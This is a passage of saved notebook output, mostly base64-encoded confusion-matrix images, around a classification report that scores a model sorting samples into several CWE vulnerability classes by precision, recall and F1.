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\n"
          },
          "metadata": {}
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "\n",
            "Classification Report for model_full:\n",
            "              precision    recall  f1-score   support\n",
            "\n",
            "     CWE-352       0.92      0.93      0.93       146\n",
            "     CWE-538       0.77      0.89      0.82        92\n",
            "     CWE-601       0.83      0.77      0.80        71\n",
            "      CWE-77       0.82      0.75      0.79        73\n",
            "      CWE-79       0.84      0.63      0.72        51\n",
            "      CWE-89       0.88      0.92      0.90       272\n",
            "      CWE-94       0.96      0.87      0.91        75\n",
            "\n",
            "    accuracy                           0.87       780\n",
            "   macro avg       0.86      0.82      0.84       780\n",
            "weighted avg       0.87      0.87      0.87       780\n",
            "\n",
            "\n",
            "--- Confusion Matrix for model_final (Vulnerability Detection) ---\n",
            "\u001b[1m10/10\u001b[0m \u001b[32m━━━━━━━━━━━━━━━━━━━━\u001b[0m\u001b[37m\u001b[0m \u001b[1m0s\u001b[0m 15ms/step\n"
          ]
        },
        {
          "output_type": "display_data",
          "data": {
            "text/plain": [
              "<Figure size 800x600 with 2 Axes>"
            ],
            "image/png": "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5kzVqVNHPj4+Cg8P18iRI/XXX38V+DoKw2KxaN68eUpPTze9x5eOScwbA7d582bFxMQoNDRUpUqVUs+ePU1dhMuXL9c999yjyMhIWa1WVa1aVc8884xycnKuKs5ly5bJ29tbrVq1srX5+vqqV69eWrNmjU6cOGF6zuLFi+Xv7697773XFvul71XeNbZ+/foCj33xNTRnzhzbNdSkSRNt377dtP2vv/6q++67T8HBwfLx8dHtt99u6hbMi2fDhg16+OGHFRYWpnLlykmSjh49qocfflg1atSQr6+vQkJCdP/99xfYtXnu3DmNHDlSISEhCggI0KBBg0zXRWHGyV36+WexWJSenq4FCxbYro3Bgwdr3bp1slgs+V6rixcvlsViUXx8/GWPVZAGDRpo5syZSklJ0RtvvGG37s8//9TQoUMVHh4uq9WqOnXqaO7cubb1V/rMkqRt27apU6dOCgwMVMmSJdW6dWtt3rzZFMeff/6pYcOG2a7fypUra9SoUcrMzNT8+fN1//33S5Latm1rO07eNZTfuXb0s6ow11n79u0l/fO3hhuT21cSV6xYoSpVqujOO+8s1PYPPvigFixYoPvuu0+PPfaYtm3bpri4OP3yyy+mD6QDBw7ovvvu07BhwxQdHa25c+dq8ODBaty4serUqaNevXopKChI48ePV//+/dWlSxf5+fk5FP9PP/2krl27qn79+po2bZqsVqsOHDiQ74fKxb799lt17txZVapU0ZQpU3T+/Hm9/vrrat68uXbt2mVKUPv06aPKlSsrLi5Ou3bt0rvvvquwsDD997//LVScvXr10kMPPaRPP/1UQ4cOlfTPh3XNmjV12223mbY/dOiQli1bpvvvv1+VK1dWcnKy3n77bbVu3Vo///yzIiMjVatWLU2bNk2TJk3SiBEj1LJlS0myey9Pnz6tzp07q1+/fho4cKDCw8Pzje/VV1/V2rVrFR0drfj4eHl6eurtt9/WqlWrtHDhQkVGRub7vFq1amnhwoUaP368ypUrp8cee0ySFBoaqvPnz6tNmzY6cOCAxowZo8qVK2vp0qUaPHiwUlJS7L58SNK8efN04cIFjRgxQlarVcHBwZc9p5s2bdLnn3+u0aNHS5Li4uLUtWtXPf7443rrrbf08MMP66+//tL06dM1dOhQrV271vbc+fPna8iQIWrSpIni4uKUnJysV199VZs3b9bu3bttle1Vq1apd+/eql27tuLi4nT69GkNGTLElixcbOTIkbb9jhs3TocPH9Ybb7yh3bt3a/PmzfLy8rrs6ynIwoULNWfOHH3//fd69913JemKf69jx45V6dKlNXnyZB05ckQzZ87UmDFjtGTJErtz4Ofnp5iYGPn5+Wnt2rWaNGmSzp49qxkzZjgc55YtW1S3bl3T6xwwYIAWLFigjz76yDZWUfrni9A333yj/v37y9fX1+Hj5Wfx4sX6+++/NXLkSFksFk2fPl29evXSoUOHbHH99NNPat68uW655RY9+eSTKlWqlD766CP16NFDn3zyiXr27Gm3z4cfflihoaGaNGmS0tPTJf3zBW/Lli3q16+fypUrpyNHjmjWrFlq06aNfv75Z5UsWdJuH2PGjFFQUJCmTJmiffv2adasWTp69KgtAb5aCxcu1IMPPqg77rhDI0aMkCRVrVpVzZo1U/ny5bVo0SLT61m0aJGqVq2qqKioqz5u3uf6qlWrbDcpJScnq1mzZrYvcKGhofrqq680bNgwnT17Vo8++ugVP7PWrl2rzp07q3Hjxpo8ebI8PDw0b9483XXXXdq0aZPuuOMOSf+Ma7zjjjuUkpKiESNGqGbNmvrzzz/18ccf69y5c2rVqpXGjRun1157TU899ZRq1aolSbb/XsrRz6rCXGeSFBgYqKpVq2rz5s0aP378VZ9vuJCr+7tdKTU11ZBkdO/evVDbJyQkGJKMBx980K59woQJhiRj7dq1traKFSsakoyNGzfa2k6cOGFYrVbjscces7Xljbu5dDxeQWOOJk+ebFz8tr3yyiuGJOPkyZMFxp3f2J6GDRsaYWFhxunTp21te/bsMTw8PIxBgwaZjjd06FC7ffbs2dMICQkp8JgXv45SpUoZhmEY9913n9GuXTvDMA